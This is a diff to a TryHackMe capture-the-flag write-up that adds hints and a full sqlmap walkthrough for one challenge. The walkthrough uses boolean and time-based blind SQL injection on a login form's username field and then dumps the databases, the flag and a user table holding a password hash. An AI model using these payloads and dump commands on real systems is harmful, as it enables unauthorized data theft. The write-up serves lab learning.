@@ -33,6 +33,7 @@ Note: All the challenges flag are formatted as THM{flag}, unless stated otherwis
 <p>Submit all your easter egg right here. Gonna find it all!</p>
 
 > 2.1 - <em>Easter 1</em><br>
+> <code>Question Hint</code>: Check the robots.
 >> <strong>THM{4u70b07_r0ll_0u7}</strong><br>
 <p></p>
 
@@ -150,6 +151,7 @@ root@ip-[Attack_IP]:~#
 <br>
 
 > 2.2 - <em>Easter 2</em><br>
+> <code>Question Hint</code>: Decode the base64 multiple times. Don't forget there are something being encoded.
 >> <strong>THM{f4ll3n_b453}</strong><br>
 <p><br></p>
 
@@ -166,7 +168,10 @@ DesKel_secret_base
 
 ![image](https://github.com/user-attachments/assets/febcb3a7-3bbc-4e89-ad25-ad043f9daa53)     
 
+<br>
+
 > 2.3 - <em>Easter 3</em><br>
+> <code>Question Hint</code>: Directory buster with common.txt might help.
 >> <strong>THM{y0u_c4n'7_533_m3}</strong><br>
 <p><br></p>
 
@@ -174,12 +179,262 @@ DesKel_secret_base
 
 ![image](https://github.com/user-attachments/assets/4c0cf585-4d13-4ecd-bee6-197160b3b139)
 
+<br>
+
 > 2.4 - <em>Easter 4</em><br>
-> <code>Hint</code>: time-based sqli
+> <code>Question Hint</code>: time-based sqli
 >> <strong>______</strong><br>
-<p><br></p>
+<p></p>
+
+![image](https://github.com/user-attachments/assets/56d0d814-c921-4443-8361-a38febbae083)
+
+![image](https://github.com/user-attachments/assets/5b40e8da-e1a9-4c97-965c-e1b5905d80ed)
+
+![image](https://github.com/user-attachments/assets/190353b2-b02f-4305-8e98-95c06212613e)
+
+<pre><code>root@ip-[Attack_IP]:~# sqlmap -r request.txt --dbs --level 3 --risk 3
+...
+...
+22:12:17] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[22:12:17] [INFO] testing 'MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[22:12:17] [INFO] testing 'Generic UNION query (93) - 1 to 10 columns'
+[22:12:18] [INFO] testing 'MySQL UNION query (93) - 1 to 10 columns'
+[22:12:20] [WARNING] User-Agent parameter 'User-Agent' does not seem to be injectable
+sqlmap identified the following injection point(s) with a total of 21062 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
+---
+[22:12:20] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
+web application technology: Apache 2.2.22, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+[22:12:20] [INFO] fetching database names
+[22:12:20] [INFO] fetching number of databases
+[22:12:20] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[22:12:20] [INFO] retrieved: 4
+[22:12:20] [INFO] retrieved: information_schema
+[22:12:21] [INFO] retrieved: THM_f0und_m3
+[22:12:21] [INFO] retrieved: mysql
+[22:12:21] [INFO] retrieved: performance_schema
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] THM_f0und_m3
+
+[22:12:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/[Target_IP]'
+
+[*] shutting down at 22:12:22
+</code></pre>
+
+<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -D THM_f0und_m3 --tables
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.2.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 22:14:05
+
+[22:14:05] [INFO] parsing HTTP request from 'request'
+[22:14:05] [INFO] resuming back-end DBMS 'mysql' 
+[22:14:05] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
+---
+[22:14:05] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
+web application technology: Apache 2.2.22, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+[22:14:05] [INFO] fetching database names
+[22:14:05] [INFO] fetching number of databases
+[22:14:05] [INFO] resumed: 4
+[22:14:05] [INFO] resumed: information_schema
+[22:14:05] [INFO] resumed: THM_f0und_m3
+[22:14:05] [INFO] resumed: mysql
+[22:14:05] [INFO] resumed: performance_schema
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] THM_f0und_m3
+
+[22:14:05] [INFO] fetching tables for database: 'THM_f0und_m3'
+[22:14:05] [INFO] fetching number of tables for database 'THM_f0und_m3'
+[22:14:05] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[22:14:05] [INFO] retrieved: 2
+[22:14:05] [INFO] retrieved: nothing_inside
+[22:14:06] [INFO] retrieved: user
+Database: THM_f0und_m3
+[2 tables]
++----------------+
+| user           |
+| nothing_inside |
++----------------+
+
+[22:14:06] [INFO] fetched data logged to text files under '/root/.sqlmap/output/[Target_ID]'
+
+[*] shutting down at 22:14:06
+
+root@ip-[Attack_IP]:~# 
+</code></pre>
+
+<br>
+
+<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --columns
+       ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.4#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 22:17:23
+
+[22:17:23] [INFO] parsing HTTP request from 'request'
+[22:17:23] [INFO] resuming back-end DBMS 'mysql' 
+[22:17:23] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
+---
+[22:17:23] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
+web application technology: Apache 2.2.22, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+[22:17:23] [INFO] fetching database names
+[22:17:23] [INFO] fetching number of databases
+[22:17:23] [INFO] resumed: 4
+[22:17:23] [INFO] resumed: information_schema
+[22:17:23] [INFO] resumed: THM_f0und_m3
+[22:17:23] [INFO] resumed: mysql
+[22:17:23] [INFO] resumed: performance_schema
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] THM_f0und_m3
+
+[22:17:23] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+[22:17:23] [INFO] fetching current database
+[22:17:23] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[22:17:23] [INFO] retrieved: THM_f0und_m3
+[22:17:23] [INFO] fetching columns for table 'nothing_inside' in database 'THM_f0und_m3'
+[22:17:23] [INFO] retrieved: 1
+[22:17:23] [INFO] retrieved: Easter_4
+[22:17:24] [INFO] retrieved: varchar(30)
+Database: THM_f0und_m3
+Table: nothing_inside
+[1 column]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| Easter_4 | varchar(30) |
++----------+-------------+
+
+[22:17:24] [INFO] fetched data logged to text files under '/root/.sqlmap/output/[Target_IP]'
+
+[*] shutting down at 22:17:24
+
+root@ip-10-10-146-248:~# 
+</code></pre>
+
+
+<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --dump-all
+       ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.2.4#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 22:19:29
+
+[22:19:29] [INFO] parsing HTTP request from 'request'
+[22:19:29] [INFO] resuming back-end DBMS 'mysql' 
+[22:19:29] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
+---
+[22:19:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
+web application technology: Apache 2.2.22, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+[22:19:29] [INFO] fetching database names
+[22:19:29] [INFO] fetching number of databases
+[22:19:29] [INFO] resumed: 4
+[22:19:29] [INFO] resumed: information_schema
+  ...
+  ...
+[22:20:00] [INFO] fetching entries for table 'nothing_inside' in database 'THM_f0und_m3'
+[22:20:00] [INFO] fetching number of entries for table 'nothing_inside' in database 'THM_f0und_m3'
+[22:20:00] [INFO] retrieved: 1
+[22:20:00] [INFO] retrieved: THM{1nj3c7_l1k3_4_b055}
+Database: THM_f0und_m3
+Table: nothing_inside
+[1 entry]
++-------------------------+
+| Easter_4                |
++-------------------------+
+| THM{1nj3c7_l1k3_4_b055} |
++-------------------------+
+
+[22:20:01] [INFO] table 'THM_f0und_m3.nothing_inside' dumped to CSV file '/root/.sqlmap/output/10.10.157.196/dump/THM_f0und_m3/nothing_inside.csv'
+[22:20:01] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
+[22:20:01] [INFO] retrieved: 2
+[22:20:01] [INFO] retrieved: username
+[22:20:01] [INFO] retrieved: password
+[22:20:01] [INFO] fetching entries for table 'user' in database 'THM_f0und_m3'
+[22:20:01] [INFO] fetching number of entries for table 'user' in database 'THM_f0und_m3'
+[22:20:01] [INFO] retrieved: 2
+[22:20:01] [INFO] retrieved: 05f3672ba34409136aa71b8d00070d1b
+[22:20:03] [INFO] retrieved: DesKel
+[22:20:03] [INFO] retrieved: He is a nice guy, say hello for me
+...  
+</code></pre>
+
+<br>
+
 
 > 2.5 - <em>Easter 5</em><br>
+> <code>Question Hint</code>:
 >> <strong>______</strong><br>
 <p><br></p>
 
